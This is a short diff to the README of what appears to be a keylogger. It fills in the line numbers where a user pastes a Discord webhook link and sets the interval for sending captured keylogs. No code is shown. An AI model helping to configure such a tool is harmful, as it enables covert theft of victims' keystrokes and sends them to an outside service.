@@ -9,5 +9,5 @@ Required:
 2) A Discord server with a channel where webhooks are enabled
 
 Before executing:
-1) Paste your Discord webhook link (line )
-2) Specify the time interval for sending keylogs (line )
+1) Paste your Discord webhook link (line 13)
+2) Specify the time interval for sending keylogs (line 15)
